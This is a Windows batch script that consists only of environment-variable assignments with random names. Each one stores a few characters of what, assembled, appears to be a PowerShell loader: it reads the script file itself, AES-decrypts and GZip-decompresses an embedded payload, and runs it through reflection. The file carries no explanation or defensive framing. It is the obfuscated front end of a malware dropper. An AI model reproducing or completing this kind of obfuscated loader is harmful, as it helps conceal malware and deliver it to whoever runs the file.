@echo off
set "avpVEaKOJE=$QgL"
set "fIkwvbwDXs=th('"
set "djVQduDNaK=ptog"
set "lMMUDcbqwk=('%~f0'"
set "YSOrZisYDF=:: '"
set "BubSuWFbhC=cCu."
set "LDnCHnyqaX=('ev"
set "HECCiGCrPe=orF'"
set "lzoakssKfS=HO3I"
set "jDwhpBvwrl='[-1"
set "YdNEXYWiaG=TxXe"
set "QlRJXODltg=);$H"
set "vakVbsknqY=Syst"
set "fFTMcdGBXr=in $"
set "uzhELDcTPp=and "
set "IDlImooxeg=.GZi"
set "EocWWaDELr=ypto"
set "FYTnEAwyfg=rity"
set "fzZbLdDyCJ=mS ="
set "CXJCiROEmo=gth)"
set "oadkCKRvTX=tion"
set "IrSGIXEOzz=S = "
set "xWREIpuYjQ=m.IO"
set "rEuFPnBJlA=nage"
set "lMGNXYdAmQ= '')"
set "TjMdVrPhOK=TDFL"
set "dPyAXEkAOk=comm"
set "EKSsryHVdn=S = "
set "yqcVKBKUmj=rR);"
set "JncNrcjiLM=();$"
set "MndduxfAHB=ress"
set "EwyBSCnSGz=New-"
set "JlHohxKkls=yste"
set "tbkvvXbPzt=iron"
set "PJZytYuqOO=($VR"
set "nmrkqkrTUI=rity"
set "wajQoUZqzZ=2VUN"
set "gcbdykIqOe=yTo("
set "mxynCxLvkz=flec"
set "wquGUtFpbT=, (,"
set "hiqwzjFXRR=ect "
set "nUDtEzxvvA=ionM"
set "xpGBAvcdkk=pher"
set "aliUqWIpHB=$eVG"
set "ITCrtaKTsM=[Sys"
set "CJZWtolZyy=ress"
set "foJGfEcVcp=lBlo"
set "vZGqmzGcge=ddin"
set "RurSRdzFoO=t Sy"
set "CXbkOGakiJ=yste"
set "AOdFoFUXxG=se()"
set "pZfdTVltcj=ode]"
set "IfRlcMlbdV=.Cry"
set "OiaRFzYZkW=k) {"
set "OAgnufyNQR=stem"
set "OxutIsYTVM=File"
set "xMhNSDudPq=V = "
set "PAAGblGjlO=ck($"
set "TUiTYgCCiW=vert"
set "uzalJbRgXL=am;$"
set "nnqPqJrKxD=Secu"
set "GbALBcSIyR=, $f"
set "WnLQoDAomC=).Sp"
set "GJUPiPvgJp=[-1."
set "JlCKptmqXj=tem."
set "CutZhdqFRL=]::("
set "JHxTDYuKvT=oArr"
set "cCyeKqCfdC=ing("
set "ORCqwxsLDn=; };"
set "HDjpcgiYvn=oryS"
set "DVPzwORqeT=Hq.T"
set "xnvoTRIZLj=onve"
set "FyaUATnuif=ert]"
set "ddRpqIAbTP=n ''"
set "bPwRumtqLX=nirt"
set "otnwmPrTlm=1..-"
set "pPNsoXOwQh=g = "
set "guPJdTlMgx=Obje"
set "QuGykWadxU=]::C"
set "jwZXbzvWQD=;$Dm"
set "SHuSEJEugw=Disp"
set "VWevwYIZKm=)))"
set "pQnoKuCKoM=;$mr"
